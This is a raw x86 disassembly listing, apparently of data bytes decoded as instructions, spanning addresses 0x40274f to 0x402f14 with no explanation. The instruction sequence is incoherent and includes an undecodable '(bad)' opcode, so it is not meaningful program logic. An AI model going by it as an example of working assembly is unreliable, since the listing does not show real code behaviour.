  40274f:	adc    BYTE PTR [ecx+eiz*4+0x307a10],al
  402756:	mov    BYTE PTR [eax-0x40],dl
  402759:	add    al,BYTE PTR [eax+0x2]
  40275c:	add    BYTE PTR [ecx],dh
  40275e:	inc    esp
  40275f:	push   cs
  402760:	or     cl,BYTE PTR [eax]
  402762:	adc    BYTE PTR [edx],0xa0
  402765:	add    DWORD PTR [eax],eax
  402767:	xchg   esi,eax
  402768:	add    BYTE PTR ds:0x41c6280,cl
  40276e:	add    BYTE PTR [eax],al
  402770:	add    ah,al
  402772:	and    BYTE PTR [ecx+0x520a25cc],al
  402778:	add    DWORD PTR [ebx],eax
  40277a:	inc    eax
  40277b:	and    edi,edi
  40277d:	adc    eax,0x4132c8
  402782:	xchg   ebx,eax
  402783:	and    BYTE PTR ds:0x1000018,ah
  402789:	inc    edx
  40278a:	adc    BYTE PTR [eax],ah
  40278c:	add    eax,DWORD PTR [eax+ecx*1]
  40278f:	sub    DWORD PTR [eax+0x45],esp
  402792:	adc    BYTE PTR [eax],dl
  402794:	add    al,0x28
  402796:	add    BYTE PTR [eax],al
  402798:	add    al,BYTE PTR [ecx]
  40279a:	add    BYTE PTR [edx],dl
  40279c:	adc    DWORD PTR [eax+0x2],edx
  40279f:	sbb    BYTE PTR [eax],bh
  4027a1:	xor    BYTE PTR [eax+0x40],dl
  4027a4:	add    BYTE PTR [eax],cl
  4027a6:	add    al,0x20
  4027a8:	sbb    DWORD PTR [eax-0x5c],esp
  4027ab:	mov    al,ds:0x72017140
  4027b0:	add    al,BYTE PTR [eax]
  4027b2:	push   eax
  4027b3:	inc    ecx
  4027b4:	inc    edx
  4027b5:	adc    cl,BYTE PTR [eax]
  4027b7:	push   cs
  4027b8:	or     BYTE PTR [eax+eax*1+0x9],al
  4027bc:	inc    ebp
  4027bd:	fwait
  4027be:	fs add al,0x0
  4027c1:	adc    DWORD PTR [eax],eax
  4027c3:	push   edx
  4027c4:	rol    BYTE PTR [ecx],0xa0
  4027c7:	adc    BYTE PTR [eax+eax*1+0x9],0x89
  4027cc:	or     al,0x80
  4027ce:	or     BYTE PTR [ecx],cl
  4027d0:	add    BYTE PTR [esi-0x7f3dbfce],0xd1
  4027d7:	mov    BYTE PTR [eax],al
  4027d9:	sub    dl,al
  4027db:	add    BYTE PTR [eax],ah
  4027dd:	inc    eax
  4027de:	or     al,0xd
  4027e0:	ror    DWORD PTR [eax],0x86
  4027e3:	loopne 0x402846
  4027e5:	adc    al,BYTE PTR [eax]
  4027e7:	pop    edx
  4027e8:	add    dl,BYTE PTR [ebx-0x3e]
  4027eb:	aad    0x8d
  4027ed:	adc    BYTE PTR [edx+esi*2],0x15
  4027f1:	or     DWORD PTR [edx+0x2],ecx
  4027f4:	test   BYTE PTR [ecx],al
  4027f6:	add    BYTE PTR [eax+0x20120c40],dl
  4027fc:	and    ah,BYTE PTR [edx+ebp*8-0x60]
  402800:	nop
  402801:	nop
  402802:	and    BYTE PTR [eax+eax*2+0x63],ch
  402806:	add    BYTE PTR [eax+0x4],al
  402809:	push   edx
  40280a:	or     DWORD PTR [eax+0x48001a40],eax
  402810:	add    BYTE PTR [edx+edx*2],ah
  402813:	and    ch,ch
  402815:	jo     0x402818
  402817:	inc    eax
  402818:	shl    BYTE PTR [edx-0x70],0x0
  40281c:	or     bl,BYTE PTR [edx+eax*1-0x8]
  402820:	adc    al,BYTE PTR [edx]
  402822:	adc    dl,BYTE PTR [eax+0x50680021]
  402828:	sub    BYTE PTR [edx+0x1520040],cl
  40282e:	or     DWORD PTR [edx],eax
  402830:	and    al,0x30
  402832:	or     eax,0xc966a22
  402837:	add    BYTE PTR [ebx],ah
  402839:	adc    al,BYTE PTR [eax]
  40283b:	and    BYTE PTR [eax],dl
  40283d:	inc    ebp
  40283e:	jnp    0x402840
  402840:	add    DWORD PTR [ecx+0x44],ecx
  402843:	add    BYTE PTR [ecx+edx*2+0x2005c0c0],bl
  40284a:	push   es
  40284b:	xor    al,0xa0
  40284d:	into   
  40284e:	or     al,0x28
  402850:	sbb    al,al
  402852:	pop    ss
  402853:	or     DWORD PTR [eax+edx*1+0x20250008],0xa48a500
  40285e:	add    al,0x30
  402860:	add    BYTE PTR [eax-0x6bf7a800],al
  402866:	data16 adc al,BYTE PTR [eax]
  402869:	or     BYTE PTR [eax],ch
  40286b:	leave  
  40286c:	and    DWORD PTR [edx+eiz*8],ebp
  40286f:	pop    eax
  402870:	and    BYTE PTR [eax],0x10
  402873:	test   al,0x4
  402875:	xor    al,BYTE PTR [eax]
  402877:	push   es
  402878:	and    BYTE PTR [ebp+0x6302e501],al
  40287e:	add    BYTE PTR [eax],bl
  402880:	and    al,BYTE PTR [eax]
  402882:	sub    ecx,DWORD PTR [ecx]
  402884:	inc    ebp
  402885:	arpl   WORD PTR [edi],cx
  402887:	add    BYTE PTR [eax+0x3a],ah
  40288a:	add    al,0x16
  40288c:	jae    0x4028be
  40288e:	add    esp,DWORD PTR [ecx+0x2c60500]
  402894:	add    BYTE PTR [ecx-0x7f77cd87],cl
  40289a:	add    BYTE PTR [ecx+0x4b],al
  40289d:	test   DWORD PTR [ebx],eax
  40289f:	and    DWORD PTR [ecx],eax
  4028a1:	inc    edx
  4028a2:	popa   
  4028a3:	add    DWORD PTR [eax+eiz*8],eax
  4028a6:	and    cl,BYTE PTR [esp+eiz*8+0x63209809]
  4028ad:	push   edx
  4028ae:	sub    al,0x80
  4028b0:	mov    al,ds:0x88446080
  4028b5:	or     al,0x86
  4028b7:	pop    ecx
  4028b8:	add    BYTE PTR [eax],al
  4028ba:	or     eax,DWORD PTR [edx]
  4028bc:	add    ah,ah
  4028be:	test   eax,0x8804158
  4028c3:	add    al,BYTE PTR es:[eax]
  4028c6:	add    BYTE PTR [ecx+0x18],al
  4028c9:	or     BYTE PTR [edx],0x18
  4028cc:	rol    DWORD PTR [edx+0x186210ca],0x0
  4028d3:	push   eax
  4028d4:	and    BYTE PTR [edi+0x4],bl
  4028d7:	push   cs
  4028d8:	or     al,BYTE PTR [eax]
  4028da:	rol    BYTE PTR [ecx+0x24],1
  4028dd:	fs add eax,0x41b80822
  4028e3:	mov    eax,cs:0x24240922
  4028e9:	mov    WORD PTR [esi],es
  4028eb:	sub    DWORD PTR [edx],esi
  4028ed:	xor    DWORD PTR [ecx+eax*1],edx
  4028f0:	jae    0x402933
  4028f2:	adc    DWORD PTR [eax+ecx*4],edx
  4028f5:	inc    ecx
  4028f6:	inc    ecx
  4028f7:	add    BYTE PTR [esi+0x4],al
  4028fa:	sub    dh,BYTE PTR [edx+0x4a000e5]
  402900:	and    eax,0x269005
  402905:	mov    ds:0x10012240,eax
  40290a:	add    DWORD PTR [edx+ecx*1],ecx
  40290d:	add    BYTE PTR gs:[ecx+0x2],cl
  402911:	adc    BYTE PTR [eax],al
  402913:	adc    BYTE PTR [eax+0x21550870],al
  402919:	xchg   esp,eax
  40291a:	and    dl,BYTE PTR [esi+0x11830]
  402920:	mov    al,ds:0x8cc8c546
  402925:	pop    ecx
  402926:	add    al,BYTE PTR [eax]
  402928:	inc    edx
  402929:	dec    ecx
  40292a:	add    BYTE PTR [eax+0x0],al
  40292d:	add    BYTE PTR [eax+eax*4],al
  402930:	add    eax,0x340002
  402935:	adc    BYTE PTR [edx-0x68],dl
  402938:	adc    al,0x51
  40293a:	inc    esp
  40293b:	add    al,0xe0
  40293d:	mov    al,BYTE PTR [eax]
  40293f:	inc    eax
  402940:	mov    ds:0x23020902,al
  402945:	mov    dh,0x90
  402947:	bound  ebp,QWORD PTR [edx+0x2c]
  40294a:	sub    esp,DWORD PTR [eax+0x51591039]
  402950:	add    al,0x22
  402952:	add    BYTE PTR [eax+0x8],0xd
  402956:	inc    edx
  402957:	add    BYTE PTR [eax-0x7feffaf0],dl
  40295d:	or     DWORD PTR ds:0x2030e4,esp
  402963:	add    ebx,DWORD PTR [edx+0x11]
  402966:	add    cl,BYTE PTR [ecx]
  402968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402969:	ret    0xa48c
  40296c:	or     eax,0x90a07004
  402971:	or     DWORD PTR [ecx+0x2],ebx
  402974:	jne    0x40297e
  402976:	sub    DWORD PTR [ebx+eiz*1],eax
  402979:	add    al,0x6
  40297b:	pop    ebp
  40297c:	mov    BYTE PTR [esi],al
  40297e:	and    BYTE PTR [eax+ecx*2],al
  402981:	sub    BYTE PTR [eax+0x41054b80],ah
  402987:	add    BYTE PTR [eax],ch
  402989:	add    ah,BYTE PTR [eax]
  40298b:	or     al,0xd1
  40298d:	rol    BYTE PTR [ecx],0x8
  402990:	les    esp,FWORD PTR [ebx+esi*2]
  402993:	mov    bh,0x4
  402995:	loope  0x402919
  402997:	add    BYTE PTR [ecx],bh
  402999:	add    BYTE PTR ds:0x7751242,al
  40299f:	push   ecx
  4029a0:	mov    BYTE PTR [edi],cl
  4029a2:	pusha  
  4029a3:	nop
  4029a4:	adc    eax,DWORD PTR ds:0x1410840a
  4029aa:	add    eax,0x4e60a4
  4029af:	and    DWORD PTR [ebx],edx
  4029b1:	inc    eax
  4029b2:	and    BYTE PTR [edx],dl
  4029b4:	les    eax,FWORD PTR [eax-0x66]
  4029b7:	push   edx
  4029b8:	add    eax,0xac860008
  4029bd:	add    al,0x0
  4029bf:	and    BYTE PTR [eax+eax*1],0x20
  4029c3:	add    DWORD PTR [ecx+0x40],ebp
  4029c6:	jns    0x402a09
  4029c8:	add    DWORD PTR [eax],esp
  4029ca:	add    BYTE PTR [edx+0x0],0xc
  4029ce:	and    eax,DWORD PTR [edx]
  4029d0:	adc    al,0x0
  4029d2:	enter  0xb001,0x40
  4029d6:	dec    ebx
  4029d7:	dec    ecx
  4029d8:	pusha  
  4029d9:	and    dl,al
  4029db:	xchg   ebx,eax
  4029dc:	xor    eax,0x902002ae
  4029e1:	xor    BYTE PTR [eax],al
  4029e3:	or     BYTE PTR [eax-0x3fb9ebf4],dh
  4029e9:	pop    eax
  4029ea:	add    BYTE PTR [eax],al
  4029ec:	mov    WORD PTR [eax],cs
  4029ee:	add    ah,BYTE PTR [eax+eax*1+0x0]
  4029f2:	and    DWORD PTR [eax],eax
  4029f4:	sub    BYTE PTR [ecx],ah
  4029f6:	or     eax,0xe42
  4029fb:	and    DWORD PTR [ecx],esi
  4029fd:	adc    eax,0xe7818822
  402a02:	and    al,cl
  402a04:	or     BYTE PTR [esi],al
  402a06:	add    DWORD PTR [eax+eax*1],eax
  402a09:	adc    BYTE PTR [edx],cl
  402a0b:	add    DWORD PTR [edx],eax
  402a0d:	test   BYTE PTR [eax],al
  402a0f:	add    BYTE PTR [eax],dl
  402a11:	sub    esp,DWORD PTR [ecx]
  402a13:	sbb    DWORD PTR [ecx],esp
  402a15:	jo     0x402a1b
  402a17:	or     BYTE PTR [eax+0x2],al
  402a1a:	add    al,0x88
  402a1c:	popa   
  402a1d:	inc    eax
  402a1e:	sbb    al,BYTE PTR [edx+0x40802000]
  402a24:	xor    BYTE PTR [ebx+0x308a6c26],0x45
  402a2b:	add    BYTE PTR [edx-0x30],dl
  402a2e:	inc    eax
  402a2f:	rol    eax,0x8
  402a32:	xchg   BYTE PTR [eax],ah
  402a34:	xchg   edx,eax
  402a35:	and    al,0x17
  402a37:	or     esp,DWORD PTR [ebx+ecx*1]
  402a3a:	add    BYTE PTR [eax+0x225900a],dl
  402a40:	mov    al,ds:0x81800320
  402a45:	push   eax
  402a46:	add    DWORD PTR [ecx+eax*2-0x64],edx
  402a4a:	add    ah,al
  402a4c:	adc    eax,0x80021c44
  402a51:	add    al,BYTE PTR [ecx]
  402a53:	add    al,BYTE PTR [edi]
  402a55:	loope  0x402a68
  402a57:	adc    al,0x10
  402a59:	rol    BYTE PTR [eax+0x5],0x0
  402a5d:	add    BYTE PTR [eax+eiz*2-0x37],al
  402a61:	or     BYTE PTR [ecx],dl
  402a63:	xor    BYTE PTR [eax],0x80
  402a66:	add    BYTE PTR [ecx],al
  402a68:	add    DWORD PTR [edx],eax
  402a6a:	and    al,0x10
  402a6c:	add    al,0xc1
  402a6e:	pusha  
  402a6f:	or     bh,BYTE PTR [eax-0x7bbe67fe]
  402a75:	and    al,0x22
  402a77:	push   es
  402a78:	or     BYTE PTR [eax+0x10105275],dl
  402a7e:	shl    BYTE PTR [ecx-0x78],0x40
  402a82:	mov    al,BYTE PTR [eax]
  402a84:	add    BYTE PTR [edx+0x4010209],al
  402a8a:	inc    eax
  402a8b:	adc    BYTE PTR [edx+eax*1],al
  402a8e:	or     BYTE PTR [edx],ah
  402a90:	loopne 0x402ad2
  402a92:	add    ah,BYTE PTR [eax]
  402a94:	adc    DWORD PTR [eax],edx
  402a96:	sub    ah,al
  402a98:	xchg   edx,eax
  402a99:	rol    DWORD PTR [edi],0x4
  402a9c:	add    BYTE PTR [eax+0x0],0x28
  402aa0:	ins    DWORD PTR es:[edi],dx
  402aa1:	adc    al,0x52
  402aa3:	push   es
  402aa4:	aad    0xa8
  402aa6:	sbb    ah,ch
  402aa8:	adc    BYTE PTR [edx+0x1c001c4],cl
  402aae:	add    BYTE PTR [edx+0x20f23091],al
  402ab4:	loopne 0x402af8
  402ab6:	add    DWORD PTR [edx],0x68062040
  402abc:	and    DWORD PTR [ebx],0xc201100
  402ac2:	sbb    BYTE PTR ds:0x10042834,0x68
  402ac9:	add    BYTE PTR [eax],al
  402acb:	add    BYTE PTR [esi],cl
  402acd:	adc    al,0x81
  402acf:	push   es
  402ad0:	push   eax
  402ad1:	add    DWORD PTR [eax-0x77fdc000],eax
  402ad7:	inc    esi
  402ad8:	adc    DWORD PTR [esi],edx
  402ada:	adc    al,0x42
  402adc:	xor    DWORD PTR [edx],esp
  402ade:	int3   
  402adf:	add    cl,BYTE PTR [edx+eax*1]
  402ae2:	xchg   ecx,eax
  402ae3:	mov    al,ds:0x13000022
  402ae8:	jo     0x402b42
  402aea:	mov    al,BYTE PTR [esi]
  402aec:	add    DWORD PTR [esi],0x44000290
  402af2:	and    dl,BYTE PTR [edx-0x18]
  402af5:	add    BYTE PTR [eax],cl
  402af7:	or     BYTE PTR [ebx+eax*1+0x48],al
  402afb:	dec    esp
  402afc:	mov    ss,WORD PTR [ecx]
  402afe:	and    BYTE PTR [ecx],0x12
  402b01:	add    BYTE PTR [eax+0x58440088],al
  402b07:	xor    al,0x54
  402b09:	sub    al,0x82
  402b0b:	adc    BYTE PTR [eax+eax*2],al
  402b0e:	push   eax
  402b0f:	adc    eax,0x80022384
  402b15:	xor    eax,0x120540
  402b1a:	and    DWORD PTR gs:[edx],ebp
  402b1d:	or     al,0x11
  402b1f:	or     BYTE PTR [ecx+0x0],ch
  402b22:	or     esp,DWORD PTR [ecx]
  402b24:	inc    edx
  402b25:	loopne 0x402b29
  402b27:	xchg   esp,eax
  402b28:	dec    eax
  402b29:	inc    eax
  402b2a:	xor    al,0x4
  402b2c:	and    cl,BYTE PTR [eax]
  402b2e:	add    esp,DWORD PTR [esi-0x5d2b3af0]
  402b34:	shl    BYTE PTR [edx],0x40
  402b37:	and    BYTE PTR [edx],dl
  402b39:	add    BYTE PTR [eax+eax*1],ah
  402b3c:	sub    BYTE PTR [eax+0x22],cl
  402b3f:	cdq    
  402b40:	add    DWORD PTR [eax],ecx
  402b42:	adc    al,0x2a
  402b44:	mov    eax,DWORD PTR [edx]
  402b46:	add    al,0x40
  402b48:	add    BYTE PTR [edx+0x20090ce8],al
  402b4e:	or     al,BYTE PTR [eax-0x7bb78ffc]
  402b54:	xchg   ecx,eax
  402b55:	or     DWORD PTR [ecx],eax
  402b57:	add    BYTE PTR [eax+eax*1+0x4],ah
  402b5b:	add    eax,DWORD PTR [edx]
  402b5d:	sbb    esp,esp
  402b5f:	and    BYTE PTR [edx+0x26320008],al
  402b65:	pop    eax
  402b66:	add    eax,DWORD PTR [eax]
  402b68:	push   es
  402b69:	add    BYTE PTR [eax],dl
  402b6b:	cdq    
  402b6c:	rol    DWORD PTR [eax+edx*1+0x0],1
  402b70:	add    eax,0x2440000
  402b75:	add    ah,BYTE PTR [eax+0x8]
  402b78:	add    eax,0x22800028
  402b7d:	add    BYTE PTR [edi],ah
  402b7f:	test   DWORD PTR ds:0x80004288,eax
  402b85:	add    BYTE PTR [edx+0x23050000],dh
  402b8b:	or     al,BYTE PTR [eax+0x8c708c0]
  402b91:	add    BYTE PTR [ecx],cl
  402b93:	shr    dl,1
  402b95:	or     BYTE PTR [eax+eax*1],al
  402b98:	adc    DWORD PTR [eax-0x6f5b9fb6],eax
  402b9e:	push   es
  402b9f:	add    BYTE PTR [eax-0x7cf9e7a7],dl
  402ba5:	add    edx,DWORD PTR [eax+0x2d604001]
  402bab:	rol    BYTE PTR [eax],1
  402bad:	add    BYTE PTR [esp+ecx*4],al
  402bb0:	push   eax
  402bb1:	add    eax,DWORD PTR [edx+edx*1-0x60]
  402bb5:	or     al,0xa1
  402bb7:	mov    ch,0x90
  402bb9:	inc    edx
  402bba:	and    dl,BYTE PTR [esp+0x18]
  402bbe:	mov    al,ds:0x4c902010
  402bc3:	add    DWORD PTR [eax],esp
  402bc5:	add    edx,DWORD PTR [ecx+0x308441]
  402bcb:	inc    edx
  402bcc:	sub    al,dh
  402bce:	rcl    DWORD PTR [ebp+0x44d3a020],0x10
  402bd5:	adc    BYTE PTR [eax],al
  402bd7:	mov    es,WORD PTR [eax+0x1]
  402bda:	add    al,0x42
  402bdc:	add    al,dl
  402bde:	les    eax,FWORD PTR [ecx+0x10c00090]
  402be4:	shl    BYTE PTR [eax+eax*1],0x54
  402be8:	mov    BYTE PTR [esi],al
  402bea:	adc    al,0x80
  402bec:	add    eax,0x1f8398d
  402bf1:	or     BYTE PTR ds:0xa835081,al
  402bf7:	and    BYTE PTR [ebp+0x40010723],al
  402bfd:	push   0x5912ea8
  402c02:	pusha  
  402c03:	push   ecx
  402c04:	les    esp,FWORD PTR [eax+0x24098201]
  402c0a:	sbb    al,0x8
  402c0c:	add    BYTE PTR [eax+0x0],dl
  402c0f:	add    BYTE PTR [eax],al
  402c11:	sbb    BYTE PTR [eax+0x28],cl
  402c14:	adc    BYTE PTR [eax+0x401125],dl
  402c1a:	add    BYTE PTR [eax],al
  402c1c:	and    BYTE PTR [ecx],ah
  402c1e:	adc    eax,0x96002800
  402c23:	add    DWORD PTR [eax+eax*1],esp
  402c26:	dec    edx
  402c27:	adc    al,0x1
  402c29:	add    BYTE PTR [eax+0x804a511],dl
  402c2f:	adc    eax,0x40680270
  402c34:	add    DWORD PTR [ebx+0xc],edx
  402c37:	and    ecx,DWORD PTR [ebx]
  402c39:	and    DWORD PTR [eax],esp
  402c3b:	adc    al,0x6a
  402c3d:	and    al,BYTE PTR [eax]
  402c3f:	and    bl,BYTE PTR [eax]
  402c41:	add    al,0x40
  402c43:	add    al,al
  402c45:	mov    cl,al
  402c47:	and    BYTE PTR [eax],0x43
  402c4a:	xor    BYTE PTR [ecx],ah
  402c4c:	add    BYTE PTR [ebp-0x7f],bl
  402c4f:	adc    BYTE PTR [eax+ecx*4+0x48000480],dh
  402c56:	push   es
  402c57:	add    BYTE PTR [eax],ah
  402c59:	push   ecx
  402c5a:	add    BYTE PTR [edx],cl
  402c5c:	inc    esp
  402c5d:	adc    BYTE PTR [eax],0x0
  402c60:	inc    ebx
  402c61:	inc    eax
  402c62:	shr    BYTE PTR [eax],0x8
  402c65:	add    BYTE PTR [eax],al
  402c67:	add    al,0x80
  402c69:	xor    BYTE PTR [edx-0x5c],cl
  402c6c:	sub    BYTE PTR [eax],cl
  402c6e:	add    al,al
  402c70:	sbb    al,ah
  402c72:	inc    ebp
  402c73:	sar    BYTE PTR [ebx],0x81
  402c76:	add    DWORD PTR [ecx+0x9],ecx
  402c79:	xchg   esi,eax
  402c7a:	rol    BYTE PTR [ecx-0x7f],1
  402c7d:	inc    eax
  402c7e:	inc    eax
  402c7f:	add    BYTE PTR [eax],dl
  402c81:	bound  ecx,QWORD PTR [ebp+ebp*4+0x681118]
  402c88:	adc    BYTE PTR [edx],ch
  402c8a:	add    al,bl
  402c8c:	dec    ebp
  402c8d:	or     BYTE PTR [eax+0x11],ch
  402c90:	add    al,0x1d
  402c92:	rcl    BYTE PTR [eax],0xa0
  402c95:	adc    DWORD PTR [eax],eax
  402c97:	and    BYTE PTR [ecx],0x1a
  402c9a:	or     BYTE PTR [ebx],cl
  402c9c:	xor    BYTE PTR [ebp+0x11],dl
  402c9f:	adc    BYTE PTR [ebx],al
  402ca1:	add    al,BYTE PTR [eax]
  402ca3:	adc    al,0x81
  402ca5:	sub    al,BYTE PTR [edx]
  402ca7:	int3   
  402ca8:	cmp    BYTE PTR [esi],dl
  402caa:	or     BYTE PTR [eax+0x0],ch
  402cad:	dec    eax
  402cae:	mov    DWORD PTR [eax+eax*1+0x620a1000],eax
  402cb5:	call   0x85:0x71827246
  402cbc:	dec    esi
  402cbd:	add    BYTE PTR [edx],ah
  402cbf:	add    al,BYTE PTR [eax]
  402cc1:	adc    dl,al
  402cc3:	hlt    
  402cc4:	adc    BYTE PTR [eax],ah
  402cc6:	add    BYTE PTR [eax],al
  402cc8:	add    ch,BYTE PTR [ecx]
  402cca:	pusha  
  402ccb:	mov    DWORD PTR [eax-0x1fffeb80],edx
  402cd1:	pop    esp
  402cd2:	add    al,0xa
  402cd4:	and    al,BYTE PTR [ecx+eiz*1+0x4]
  402cd8:	fld    DWORD PTR [edx]
  402cda:	ret    0x4008
  402cdd:	pusha  
  402cde:	rol    BYTE PTR [eax],0x8e
  402ce1:	inc    esp
  402ce2:	add    al,0x80
  402ce4:	popf   
  402ce5:	sub    eax,0x90089609
  402cea:	sbb    DWORD PTR [eax],0xffffffe8
  402ced:	sbb    BYTE PTR [eax],0x50
  402cf0:	add    BYTE PTR [edx],al
  402cf2:	push   cs
  402cf3:	inc    eax
  402cf4:	inc    eax
  402cf5:	or     BYTE PTR [eax],al
  402cf7:	sub    BYTE PTR [esi],dl
  402cf9:	adc    BYTE PTR [esi],al
  402cfb:	xchg   ebx,eax
  402cfc:	pusha  
  402cfd:	add    BYTE PTR [ecx],al
  402cff:	sub    BYTE PTR [ebx],al
  402d01:	and    BYTE PTR [esp],al
  402d04:	or     BYTE PTR [edx+0x0],dh
  402d07:	rol    BYTE PTR [ecx-0x6e9ff570],0x41
  402d0e:	xor    al,BYTE PTR [ebx]
  402d10:	add    BYTE PTR [ecx],ah
  402d12:	xor    DWORD PTR [eax],eax
  402d14:	add    eax,0x100e37e0
  402d19:	or     dl,BYTE PTR [ebx]
  402d1b:	mov    al,ds:0x8316010
  402d20:	add    BYTE PTR [eax+edx*1],ah
  402d23:	adc    BYTE PTR [eax+eax*1+0x10590299],0x80
  402d2b:	mov    BYTE PTR [edx+0x40],cl
  402d2e:	xor    al,0x34
  402d30:	add    BYTE PTR [esi-0x7d9ef800],0x0
  402d37:	inc    esp
  402d38:	push   es
  402d39:	fmul   DWORD PTR [edi]
  402d3b:	mov    BYTE PTR [eax],ah
  402d3d:	inc    ebp
  402d3e:	mov    al,ds:0xa0921038
  402d43:	add    BYTE PTR [ecx+0x3],cl
  402d46:	adc    al,BYTE PTR [ebp+0x30080102]
  402d4c:	adc    al,0x18
  402d4e:	(bad)  
  402d4f:	loopne 0x402d72
  402d51:	and    BYTE PTR [eax+0x4005122],al
  402d57:	adc    DWORD PTR [edx],ebx
  402d59:	pusha  
  402d5a:	xor    BYTE PTR ds:0x1a890802,al
  402d60:	inc    eax
  402d61:	or     al,0xc8
  402d63:	cmp    al,cl
  402d65:	rol    BYTE PTR [eax],0x80
  402d68:	or     al,BYTE PTR fs:[eax]
  402d6b:	xchg   edi,eax
  402d6c:	adc    BYTE PTR [eax],ah
  402d6e:	test   BYTE PTR [eax],cl
  402d70:	adc    al,0x78
  402d72:	lock or BYTE PTR [edx],dl
  402d75:	and    BYTE PTR [eax],bl
  402d77:	adc    BYTE PTR [edx],al
  402d79:	push   esp
  402d7a:	add    BYTE PTR [edx],0x40
  402d7d:	push   eax
  402d7e:	and    dh,BYTE PTR [eax+ecx*1+0x8]
  402d82:	add    BYTE PTR [eax-0x7a],al
  402d85:	add    ecx,DWORD PTR [ecx+eax*1+0x4]
  402d89:	mov    ch,0xa4
  402d8b:	dec    edx
  402d8c:	inc    esp
  402d8d:	add    ah,BYTE PTR [eax]
  402d8f:	sbb    eax,0xc10229
  402d94:	adc    al,0x8
  402d96:	cmp    BYTE PTR [edx],al
  402d98:	adc    BYTE PTR [eax+0x18c00802],al
  402d9e:	sbb    DWORD PTR [ebp+0x36100000],eax
  402da4:	xchg   DWORD PTR [eax],eax
  402da6:	sbb    al,0x8
  402da8:	inc    edx
  402da9:	add    BYTE PTR [eax+0x0],0xa5
  402dad:	add    eax,0x41388245
  402db2:	add    BYTE PTR [ecx],0x4
  402db5:	sbb    al,0x1
  402db7:	add    BYTE PTR [eax-0x7ccf6db0],dl
  402dbd:	sub    DWORD PTR [eax+0x10],esi
  402dc0:	in     al,0x14
  402dc2:	and    BYTE PTR [ecx],0x18
  402dc5:	add    al,BYTE PTR [edx-0x6c]
  402dc8:	push   es
  402dc9:	and    al,cl
  402dcb:	loope  0x402dde
  402dcd:	add    BYTE PTR [eax+esi*2],bl
  402dd0:	push   es
  402dd1:	dec    esp
  402dd2:	or     BYTE PTR [eax],dl
  402dd4:	or     BYTE PTR [eax],bl
  402dd6:	inc    eax
  402dd7:	adc    BYTE PTR [edx+0x5816911a],cl
  402ddd:	adc    BYTE PTR [ecx+0x3],al
  402de0:	and    BYTE PTR [eax-0x3fdbff77],al
  402de6:	and    BYTE PTR [esi],al
  402de8:	lea    eax,[eax+0x211800]
  402dee:	je     0x402df0
  402df0:	add    DWORD PTR [eax],eax
  402df2:	push   ebp
  402df3:	add    DWORD PTR ds:0xc4410850,edx
  402df9:	jno    0x402e00
  402dfb:	xor    BYTE PTR [eax+0x44045029],al
  402e01:	add    BYTE PTR [ecx+edx*4],dh
  402e04:	and    BYTE PTR [eax],al
  402e06:	inc    eax
  402e07:	mov    al,ds:0x20828
  402e0c:	or     BYTE PTR [eax],al
  402e0e:	inc    eax
  402e0f:	xchg   ecx,eax
  402e10:	add    BYTE PTR [eax+ecx*2+0x0],cl
  402e14:	pusha  
  402e15:	and    DWORD PTR [edx+0x20800006],eax
  402e1b:	or     al,BYTE PTR [ecx-0x70]
  402e1e:	push   ebp
  402e1f:	and    BYTE PTR [edx+edx*1],al
  402e22:	adc    al,0x50
  402e24:	and    BYTE PTR [eax+0x24],al
  402e27:	and    al,BYTE PTR [eax+0x20000a04]
  402e2d:	test   al,0x48
  402e2f:	adc    eax,0x4060410d
  402e34:	mov    al,ds:0x418a1810
  402e39:	inc    eax
  402e3a:	and    BYTE PTR [ebx+0x0],dl
  402e3d:	sub    DWORD PTR [ecx],0x346080b9
  402e43:	or     cl,BYTE PTR [edi]
  402e45:	add    BYTE PTR [ecx],0x22
  402e48:	ret    0xbe02
  402e4b:	les    edx,FWORD PTR [eax]
  402e4d:	mov    BYTE PTR [ecx+0x8ad222c],al
  402e53:	jno    0x402e55
  402e55:	jne    0x402e10
  402e57:	add    BYTE PTR [eax],al
  402e59:	add    BYTE PTR [eax],dl
  402e5b:	adc    eax,0x15240490
  402e60:	add    DWORD PTR [eax-0x7b4f7da8],ecx
  402e66:	ret    0x1458
  402e69:	sbb    al,0x10
  402e6b:	rol    DWORD PTR [eax],0x38
  402e6e:	mov    ah,dl
  402e70:	sbb    DWORD PTR [ecx+0x20c0116a],ebx
  402e76:	add    DWORD PTR [eax],eax
  402e78:	lock adc eax,0xa0108101
  402e7e:	add    al,0xa3
  402e80:	and    al,BYTE PTR [eax+0x18c41400]
  402e86:	add    BYTE PTR [eax],ah
  402e88:	pop    DWORD PTR [eax+edx*1-0x7f6ff200]
  402e8f:	and    bh,BYTE PTR [eax]
  402e91:	add    al,0x82
  402e93:	add    BYTE PTR [eax],0xa0
  402e96:	inc    ebp
  402e97:	add    esp,ecx
  402e99:	or     eax,0x4298448c
  402e9e:	or     BYTE PTR [edx+0x0],dl
  402ea1:	dec    eax
  402ea2:	inc    ebp
  402ea3:	xor    BYTE PTR [eax],dl
  402ea5:	mov    al,ds:0xc404d01c
  402eaa:	xor    al,0x42
  402eac:	inc    esp
  402ead:	cwde   
  402eae:	adc    BYTE PTR [edx+0x14643120],al
  402eb4:	inc    ecx
  402eb5:	inc    ebp
  402eb6:	inc    eax
  402eb7:	or     BYTE PTR [eax+0x60010421],dl
  402ebd:	js     0x402ec0
  402ebf:	add    al,BYTE PTR [eax]
  402ec1:	add    BYTE PTR [eax],dl
  402ec3:	and    BYTE PTR [eax],al
  402ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ec6:	adc    al,0x48
  402ec8:	sub    BYTE PTR [ecx+0x0],al
  402ecb:	push   0x980e604
  402ed0:	mov    ds:0x4182108d,eax
  402ed5:	xor    BYTE PTR [ecx+ebx*1+0x2],cl
  402ed9:	or     BYTE PTR [eax+eax*1],al
  402edc:	sbb    BYTE PTR [esp+ebx*1+0x42000020],dl
  402ee3:	add    BYTE PTR [eax+0x0],al
  402ee6:	and    cl,BYTE PTR [edx]
  402ee8:	add    BYTE PTR [ecx],dl
  402eea:	and    BYTE PTR [ecx],al
  402eec:	push   cs
  402eed:	pop    ss
  402eee:	test   BYTE PTR [edx+0x8b8008],al
  402ef4:	push   0x12008db0
  402ef9:	mov    eax,fs
  402efb:	or     BYTE PTR [edx+0x8],al
  402efe:	and    DWORD PTR [edx+0x101e200],edi
  402f04:	dec    eax
  402f05:	add    BYTE PTR [ecx+0x1c0a1a02],al
  402f0b:	bound  eax,QWORD PTR [esi-0x3de57f70]
  402f11:	shl    BYTE PTR [eax+edi*1],1
  402f14:	nop
